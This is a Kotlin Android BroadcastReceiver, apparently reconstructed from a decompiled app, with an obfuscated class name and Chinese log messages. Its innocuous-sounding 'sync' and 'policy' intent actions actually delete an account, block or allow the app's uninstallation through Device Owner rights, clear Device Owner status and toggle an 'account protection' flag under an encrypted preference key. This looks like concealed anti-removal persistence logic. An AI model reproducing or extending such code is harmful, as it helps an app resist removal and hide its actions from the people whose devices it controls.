package com.storm.safe.rock.receiver

import android.app.admin.DevicePolicyManager
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.util.Log
import com.storm.safe.rock.util.StringUtil

/**
 * Device Owner / config sync BroadcastReceiver.
 * Handles ACTION_SYNC_CLEANUP, ACTION_PROFILE_READY, ACTION_PROFILE_RESET,
 * ACTION_SYNC_PAUSE, ACTION_POLICY_ENFORCE, ACTION_SYNC_RESUME,
 * ACTION_SYNC_INIT, ACTION_POLICY_RELEASE.
 *
 * Reverse-engineered from JADX: receiver/izkmisshyc.java (188 lines).
 */
class izkmisshyc : BroadcastReceiver() {

    companion object {
        private const val TAG = "DeviceOwnerReceiver"

        const val ACTION_SYNC_CLEANUP = "com.storm.safe.rock.ACTION_SYNC_CLEANUP"
        const val ACTION_PROFILE_READY = "com.storm.safe.rock.ACTION_PROFILE_READY"
        const val ACTION_PROFILE_RESET = "com.storm.safe.rock.ACTION_PROFILE_RESET"
        const val ACTION_SYNC_PAUSE = "com.storm.safe.rock.ACTION_SYNC_PAUSE"
        const val ACTION_POLICY_ENFORCE = "com.storm.safe.rock.ACTION_POLICY_ENFORCE"
        const val ACTION_SYNC_RESUME = "com.storm.safe.rock.ACTION_SYNC_RESUME"
        const val ACTION_SYNC_INIT = "com.storm.safe.rock.ACTION_SYNC_INIT"
        const val ACTION_POLICY_RELEASE = "com.storm.safe.rock.ACTION_POLICY_RELEASE"
    }

    override fun onReceive(context: Context?, intent: Intent?) {
        if (context == null) {
            Log.e(TAG, "Context is null")
            return
        }
        val action = intent?.action
        if (action != null) {
            when (action) {
                ACTION_SYNC_CLEANUP -> {
                    Log.d(TAG, "★★★ 收到删除账户请求 ★★★")
                    try {
                        // ADAPT: depends on AccountProtectMgr (p000 package)
                        // if (AccountProtectMgr.getInstance(context).removeAccount()) {
                        //     Log.d(TAG, "✅ 账户已删除")
                        // } else {
                        //     Log.w(TAG, "⚠️ 删除账户失败")
                        // }
                        Log.d(TAG, "✅ 账户删除逻辑 (stub)")
                    } catch (e: Exception) {
                        Log.e(TAG, "❌ 删除账户失败", e)
                    }
                }
                ACTION_PROFILE_READY -> {
                    Log.d(TAG, "★★★ Device Owner 设置成功 ★★★")
                    try {
                        val prefKey = StringUtil.decrypt("IkowPkAxAg9UJSJPEC5ENgs=")
                        context.getSharedPreferences(prefKey, 0)
                            .edit()
                            .putBoolean(prefKey, false)
                            .commit()
                        // ADAPT: depends on AccountProtectMgr (p000 package)
                        // AccountProtectMgr.getInstance(context).removeAccount()
                        zbrefryi.Companion.blockUninstall(context)
                        Log.d(TAG, "✅ Device Owner 配置完成：账户保护已禁用，卸载保护已启用")
                    } catch (e: Exception) {
                        Log.e(TAG, "❌ Device Owner 配置失败", e)
                    }
                }
                ACTION_PROFILE_RESET -> {
                    Log.d(TAG, "★★★ 收到清除 Device Owner 请求 ★★★")
                    try {
                        val dpm = context.getSystemService("device_policy") as DevicePolicyManager
                        if (dpm.isDeviceOwnerApp(context.packageName)) {
                            Log.d(TAG, "当前是 Device Owner，开始清除...")
                            dpm.clearDeviceOwnerApp(context.packageName)
                            Log.d(TAG, "✅ Device Owner 已清除")
                        } else {
                            Log.w(TAG, "当前不是 Device Owner，无需清除")
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "❌ 清除 Device Owner 失败", e)
                    }
                }
                ACTION_SYNC_PAUSE -> {
                    Log.d(TAG, "★★★ 收到禁用账户保护请求 ★★★")
                    try {
                        val prefKey = StringUtil.decrypt("IkowPkAxAg9UJSJPEC5ENgs=")
                        context.getSharedPreferences(prefKey, 0)
                            .edit()
                            .putBoolean(prefKey, true)
                            .commit()
                        // ADAPT: depends on AccountProtectMgr
                        // AccountProtectMgr.getInstance(context).removeAccount()
                        Log.d(TAG, "✅ 账户保护已禁用（isAdminActivating=true）")
                    } catch (e: Exception) {
                        Log.e(TAG, "❌ 禁用账户保护失败", e)
                    }
                }
                ACTION_POLICY_ENFORCE -> {
                    Log.d(TAG, "★★★ 收到阻止卸载请求 ★★★")
                    try {
                        if (zbrefryi.Companion.blockUninstall(context)) {
                            Log.d(TAG, "✅ 已阻止卸载")
                        } else {
                            Log.w(TAG, "⚠️ 阻止卸载失败（可能不是 Device Owner）")
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "❌ 阻止卸载失败", e)
                    }
                }
                ACTION_SYNC_RESUME -> {
                    Log.d(TAG, "★★★ 收到启用账户保护请求 ★★★")
                    try {
                        val prefKey = StringUtil.decrypt("IkowPkAxAg9UJSJPEC5ENgs=")
                        context.getSharedPreferences(prefKey, 0)
                            .edit()
                            .putBoolean(prefKey, false)
                            .commit()
                        // ADAPT: depends on AccountProtectMgr
                        // AccountProtectMgr.getInstance(context).createAccount()
                        Log.d(TAG, "✅ 账户保护已启用（isAdminActivating=false）")
                    } catch (e: Exception) {
                        Log.e(TAG, "❌ 启用账户保护失败", e)
                    }
                }
                ACTION_SYNC_INIT -> {
                    Log.d(TAG, "★★★ 收到创建账户保护请求（备选方案）★★★")
                    try {
                        var isDeviceOwner = false
                        try {
                            val dpm = context.getSystemService("device_policy") as DevicePolicyManager
                            isDeviceOwner = dpm.isDeviceOwnerApp(context.packageName)
                        } catch (e: Exception) {
                            Log.e("AccountProtectMgr", "检查设备所有者状态失败", e)
                        }
                        if (isDeviceOwner) {
                            Log.d(TAG, "已是 Device Owner，无需账户保护")
                        } else {
                            // ADAPT: depends on AccountProtectMgr
                            // val created = AccountProtectMgr.getInstance(context).createAccount()
                            // if (created) Log.d(TAG, "✅ 账户保护已创建")
                            // else Log.w(TAG, "⚠️ 账户保护创建失败")
                            Log.d(TAG, "账户保护创建逻辑 (stub)")
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "❌ 创建账户保护失败", e)
                    }
                }
                ACTION_POLICY_RELEASE -> {
                    Log.d(TAG, "★★★ 收到允许卸载请求 ★★★")
                    try {
                        if (zbrefryi.Companion.allowUninstall(context)) {
                            Log.d(TAG, "✅ 已允许卸载")
                        } else {
                            Log.w(TAG, "⚠️ 允许卸载失败")
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "❌ 允许卸载失败", e)
                    }
                }
                else -> {
                    Log.d(TAG, "未知 Action: ${intent.action}")
                }
            }
        } else {
            Log.d(TAG, "未知 Action: ${intent?.action}")
        }
    }
}
